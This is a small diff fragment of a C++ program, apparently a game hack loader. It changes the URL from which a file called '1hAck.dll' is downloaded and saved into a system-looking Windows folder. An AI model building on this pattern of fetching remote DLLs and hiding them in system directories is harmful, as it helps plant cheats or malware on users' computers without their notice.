@@ -333,7 +333,7 @@ int main() {
 
     std::cout << "Success!\n\n";
 
-    std::string url = "https://1hack-ogfnfree.netlify.app/1hAck.dll";
+    std::string url = "https://1hack-ogfnfree.netlify.app/bronze/1hAck.dll";
     std::string filePath = "C:\\Program Files (x86)\\Windows NT\\Accessories\\en-US\\1hAck.dll";
 
     // Initialize WinINet
